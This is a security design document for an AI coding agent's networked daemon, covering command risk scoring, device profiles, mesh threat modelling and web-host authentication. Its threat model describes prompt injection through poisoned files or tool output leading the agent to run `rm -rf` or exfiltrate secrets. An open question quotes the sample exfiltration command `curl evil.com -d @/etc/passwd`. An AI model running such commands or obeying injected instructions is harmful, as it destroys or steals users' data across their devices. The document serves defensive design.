---
title: "Security Model"
type: implementation
status: open
layer: architecture
created: 2026-04-14
tags: [security, permissions, sandbox, access-control, command-parsing]
depends-on: ["[[architecture-overview]]", "[[infrastructure-strategy]]"]
informs:
  [
    "[[application-directories]]",
    "[[provider-architecture]]",
    "[[protocol-design]]",
    "[[consensus-model]]",
    "[[multi-device-ux]]",
    "[[tool-system]]",
  ]
---

# Security Model

## Current Decisions

### Command Approval Flow

Three user actions on any command that requires approval:

- **Enter** — approve and execute
- **Esc** — deny
- **Shift+Enter** — opt-in contextual explanation (LLM call that explains what the command does _in the context of the current conversation_, not a generic man page)

Explanation call is pre-fetched in background when command enters "ask" tier. If user approves before it finishes, call is cancelled. If user hits shift+enter, explanation is already warm or shows loading state.

### Risk Tiering (Command Parser)

Risk is assessed by decomposing shell commands into **operation × target** effects, not by classifying command names.

**Three tiers based on risk score:**

1. **Auto-approve** — read-only, no side effects (configurable threshold)
2. **Ask** — shows command, user approves/denies/explains
3. **Block** — policy rejects outright, command never reaches approval prompt

**Operation axis** (what kind of system interaction):

- read (0), metadata (1), local-write (2), append (2), overwrite (3), delete (4), execute (3), network-out (3), install (3), privilege (5)

**Target axis** (what's being touched):

- project/cwd (0), temp (0), user home (1), package/runtime (2), network/remote (3), system config (4), system binaries (4), kernel/boot (5), root (5)

Risk score = operation × target. Pipeline risk = max across all effects.

### Shell AST Parsing

Commands must be parsed into an AST to assess risk. Not regex. Must handle:

- Simple commands + flags + args
- Redirections (`>` vs `>>` changes operation from overwrite to append)
- Pipes, chains (`&&`, `||`, `;`)
- Subshells and command substitution (`$(...)`)
- Variable expansion (unresolvable → assume worst-case target)

Conservative by default: if the parser can't fully analyze a command, it escalates to "ask" tier, never "auto-approve."

### Security Profiles — Per-Device (User-Configurable)

Users define profiles that set the auto-approve/ask/block thresholds:

- **development** — liberal, auto-approves local writes, asks for network/deletes
- **production** — restrictive, only auto-approves reads, blocks privilege escalation
- **readonly** — nothing writes

**Profile is per-device, not per-session** (decided 2026-04-25, see [[protocol-design]]).

Same command (`rm -rf node_modules`) has different blast radius on home laptop vs Mac mini vs production server. The agent picks the target device for a tool; the security gate evaluates against that device's profile.

```
risk = commandRisk × deviceProfile[targetDevice]
```

Approval flow shows target device prominently:

> Run `rm -rf node_modules` on `prod-server`? [approve / deny / explain]

Devices register their profiles in the session's peer registry (see `Device` schema in `session.ts`, defined in [[protocol-design]]). The session's home device profile applies to local tool calls; peer profiles apply to dispatched tool calls.

## Daemon Threat Model (2026-06-30)

The daemon is, by design, **remote-code-execution-as-a-service** — its job is "accept a command over the network and run it." The mesh makes the blast radius the user's _entire fleet_, reachable from anywhere, possibly unattended. **Status: acknowledged, kept LIGHT for the current v1 scope.** The command-approval/risk-tiering above is Layer 3; the rest below are largely future work. Future file isolation via **nsjail**-style sandboxing (constrain the agent to codebase-related operations).

Layers (ranked by novel + catastrophic):

1. **Confused-deputy agent (the defining risk).** The daemon executes what the LLM agent tells it, and LLMs are hijackable via **prompt injection** (a poisoned file/web page/tool output/commit message). One poisoned file the agent reads could dispatch `rm -rf` or secret-exfil to _every_ device on the mesh. Human approval is the load-bearing defense (but absent in headless runs / vulnerable to fatigue); treat the agent as semi-untrusted — destructive + network-out ops should resist auto-approval regardless of profile; pursue content provenance ("user said" vs "a file said").
2. **Network reachability (Layer 0).** Daemon must bind **only** to the WireGuard interface — never `0.0.0.0`, LAN, or public. If unreachable, nothing else matters.
3. **Application auth (Layer 2).** WireGuard proves "a mesh peer," not "a legitimate engine for this session." Sign/capability-token every command so a compromised low-trust device can't command a high-trust one. WG alone makes the mesh a flat trust domain — too coarse.
4. **Asymmetric trust / segmentation (Layers 3, 7).** The mesh is a lateral-movement superhighway by design. `prod-server` defaults to readonly/block; a compromised laptop must not escalate it. Not every device should be commandable by every other.
5. **Key lifecycle (Layer 1).** WG + signing keys need the same secure-storage as API keys. Rotation and especially **revocation** (lost/stolen device) is hard in a P2P mesh with no central server.
6. **Log integrity (Layer 6).** Sign events so a compromised follower can't forge `Engine*` events into the replicated log. A compromised _leader_ can do anything — leadership is a high-value target.
7. **Daemon RCE surface (Layer 5).** Path traversal / symlink escape (tension: coding agents want broad fs access → rely on the operation×target risk model, not hard sandboxing alone), command injection (safe execution, not string concat), deserialization, resource exhaustion (fork bombs / disk-fill — also triggers spurious failover).
8. **Secrets & exfiltration (Layer 8).** fs access → `.env`/SSH/cloud creds; `network-out` is the exfil channel; injection is the trigger. Detect the read-secret-then-network-out _combination_.
9. **Supply chain (Layer 9).** Sign the `bun build --compile` daemon binary; verify on install/update.
10. **Audit (Layer 10).** The replicated event log is complete, tamper-evident (if signed) provenance of every command — who/when/which device/approved-by-whom.

This is a strong argument for the single-device-first phasing ([[infrastructure-strategy]]): a local-only agent has a contained blast radius and a present human while mesh security is gotten right.

## Per-user daemon scoping & local auth (2026-07-01)

The daemon is **user-scoped, not machine-scoped** — it runs commands only as the OS user that owns its process; **no root broker, no UID switching, no machine-daemon distributing to users.** Each OS user runs their own daemon (`~/.kuib`, own `nodeID`). **Security invariant: compromising one user's daemon compromises that OS user only, never the whole machine.** This falls out of decisions already made (user-level service, keys in user secure storage).

**Local auth = unix-socket file permissions.** The daemon binds `~/.kuib/daemon.sock` at mode `0600` in the user's home → only that user (or root) can connect. The OS filesystem permissions ARE the local authentication; no extra local auth layer. Cross-user (bob→alice on one box) goes over the mesh IP and is authenticated by `nodeID` keys like any remote ([[multi-device-ux]]).

## Coordinator/DERP isolation (2026-07-01)

The mesh needs a **dataless control plane** — self-hosted **Headscale + DERP** ([[infrastructure-strategy]]) — for node registration + relay. It must run **isolated from personal data nodes**: an internet-exposed relay should NOT share a box with sessions/keys (blast-radius separation). The control plane never sees chats/sessions/keys (those stay P2P); but because it's public-facing, give it its own container/host.

## Open Questions

- Shell parser implementation: use existing library (bash-parser, mvdan-sh wasm) or write a focused one?
- How to handle variable expansion and dynamic command construction safely?
- Should blocked commands show the reason they were blocked (leaks policy details) or just say "blocked"?
- Network exfiltration detection: how to distinguish `curl localhost:3000` from `curl evil.com -d @/etc/passwd`?
- How do profiles compose with per-command overrides? Can users allowlist specific commands that would otherwise be blocked?
- **Session portability (updated 2026-06-30, supersedes the 2026-04-25 "sessions stay on home device" stance):** sessions ARE replicated and resumable from anywhere. The engine runs on the elected leader, not a fixed home device; tool calls target a _daemon_ (the active device or an explicitly-named one), and risk is evaluated against that daemon's profile. Path resolution happens at the tool boundary against the target device's filesystem. See [[consensus-model]], [[multi-device-ux]].

## Web host auth — `kuib web` + code.kuib.ai (2026-07-01)

The web host (`kuib web`, see [[host-layer]]) exposes the engine over HTTP so a browser — a local same-origin page, or the hosted frontend at `https://code.kuib.ai` — can drive it. Because a submit runs the agent loop (i.e. can `rm -rf`), **this is the highest-risk boundary in the product** and the auth model was reasoned from an explicit attacker enumeration.

**Core rule: CORS is NOT an authorization boundary.** CORS only governs whether a cross-origin caller may _read_ the response; it does not stop the request from being _sent or processed_. So the destructive action fires regardless. Auth must be positive.

**Decision: header bearer token, not cookies.**

- A per-run, in-memory, high-entropy token gates every non-static request (`Authorization: Bearer …`; SSE carries it as a `?token=` query param because `EventSource` can't set headers).
- **Why not HttpOnly cookies** (the tempting alternative): cookies are auto-attached by the browser, which is exactly the CSRF vector. And because code.kuib.ai↔localhost is inherently _cross-site_, the cookie would need `SameSite=None` — which re-permits every attacker origin too, so `SameSite` buys no protection here. A custom `Authorization` header instead makes every request "non-simple" → forces a CORS **preflight** we deny for non-allowlisted origins → the attacker's request never fires. XSS-read risk on the token is contained (single trusted origin) and strictly less bad than cookie CSRF on an `rm -rf` endpoint.
- **No localhost TLS for v1.** The only strong pressure for it was `SameSite=None; Secure`; dropping cookies drops that. `http://localhost` is already a secure-context, loopback traffic can't be remotely sniffed, and the mesh hop is WireGuard-encrypted anyway. The public-CA-cert-for-`127.0.0.1` trick (Plex `*.plex.direct`) is real but costs per-user cert issuance or a shared-key MITM risk — not worth it while we avoid cookies.

**Defence-in-depth layers (on top of the token):**

- **Bind loopback + this node's tailscale IP only** — never `0.0.0.0` (the LAN interface is never exposed). Tailnet bind is deliberate so phone / other mesh nodes can reach it; the tailnet is WireGuard-authenticated and trusted.
- **`Host` header allowlist** (`localhost`/`127.0.0.1`/our tailscale IP/`*.ts.net`) — defeats **DNS-rebinding** (a malicious site repointing its DNS at us to masquerade as same-origin).
- **Origin allowlist, no reflection** — only loopback origins, our tailnet identity, and `https://code.kuib.ai`; every other Origin → 403.
- **Private Network Access preflight** — public site → loopback needs `Access-Control-Allow-Private-Network: true` or Chrome blocks it.
- **`Content-Type: application/json` enforced on submit** — closes the `text/plain` "simple request" CSRF bypass (text/plain avoids preflight).
- **Pairing handshake for the hosted origin** — `kuib web` prints a high-entropy, single-use, 5-min, rate-limited (≤5 attempts) code; code.kuib.ai exchanges it at `/pair` for the token. **The hosted site stays dataless** — it serves JS, never holds engine data or keys. A same-origin dev token endpoint (`/api/token`) exists **only** under `KUIB_WEB_DEV` and **never** answers the hosted origin (which must pair).
- **Remote-origin submit = elevated risk tier** — a command arriving from code.kuib.ai should face a firmer confirmation than one typed into the local TUI. Folds into the `risk = commandRisk × deviceProfile` model above (transport becomes a risk input).

**Attacker enumeration / residual risk (stress-test):**

- _DNS rebinding_ → Host-check. _CSRF via simple POST_ → forced preflight (header token) + JSON content-type. _Cross-origin SSE read_ → blocked (no ACAO for evil.com). _Token in SSE URL_ → localhost-only, per-run, ephemeral; acceptable, tighten to a per-connection stream ticket later. _Same-user local process_ → **not a new boundary** (same-user already = full trust; daemon is user-scoped). _Port guessing_ → token is the real gate, not obscurity. _Reflected-Origin misconfig_ → strict allowlist, never echo arbitrary Origin. _WebSocket (if ever added)_ → note: WS does **not** enforce CORS, so it would need in-band token + explicit Origin check. _Pairing brute-force_ → entropy + TTL + single-use + rate-limit. _Token at rest_ → memory only, regenerated per run, never written world-readable.

Verified (2026-07-01): unauth→401, bad Host→421, disallowed Origin→403, `text/plain` submit→415, authed submit→202 streaming. See [[host-layer]] for the transport/read side.
